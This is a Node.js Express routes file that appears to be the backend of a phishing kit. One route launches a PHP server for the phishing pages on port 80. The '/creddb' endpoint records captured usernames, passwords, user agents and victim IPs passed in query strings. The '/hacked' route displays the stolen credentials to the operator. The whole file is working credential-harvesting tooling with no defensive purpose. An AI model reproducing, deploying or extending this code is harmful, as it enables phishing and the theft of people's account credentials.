const express = require("express");
const routes = express.Router();
const CONST = require('./const');
const { exec } = require("child_process");
const app = express();
var ip = require("ip");
const cookieParser = require('cookie-parser');
const lowdb = require('lowdb');
const bodyParser = require('body-parser');
const FileSync = require('lowdb/adapters/FileSync'),
    path = require('path'),
    adapter = new FileSync('maindb.json'),
    db = lowdb(adapter);





var date_time = new Date();

routes.get('/',(req,res)=>{
    
    let rUsername =  db.get('admin.username').value();
    let cot = db.get('admin.credential').value();
    let count = Object.keys(cot).length
    res.render('index.ejs',{date:date_time.toISOString().slice(0,10),uname:rUsername,count:count});
})
routes.get('/server-status',(req,res)=>{
    exec("cd .webpages/ && php -S 0.0.0.0:80", (error, stdout, stderr) => {
        
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
    let rUsername =  db.get('admin.username').value();
    let status =  "Server Running";
     res.render('attack.ejs',{date:date_time.toISOString().slice(0,10),uname:rUsername,ip:ip.address(),status:status});
})


routes.get('/hack',(req,res)=>{
    let rUsername =  db.get('admin.username').value();
    let status =  "Server Start";
    res.render('attack.ejs',{date:date_time.toISOString().slice(0,10),uname:rUsername,ip:ip.address(),status:status});
})
routes.get('/hacked',(req,res)=>{
    let rUsername =  db.get('admin.username').value();
    let dat = db.get('admin.credential').value();
    res.render('data.ejs',{date:date_time.toISOString().slice(0,10),uname:rUsername,cred:dat});
})
routes.get('/creddb',(req,res)=>{
    cred_type = req.query.cred_type;
    username = req.query.username;
    password = req.query.password;
    useragent = req.query.useragent;
    ip = req.query.ip;
    db.get('admin.credential').push({
                credtype:cred_type,
                username: username,
                password: password,
                useragent: useragent,
                ip: ip,
                time:date_time.toISOString()
            }).write()
    res.send('Hello World!');
})

module.exports = routes;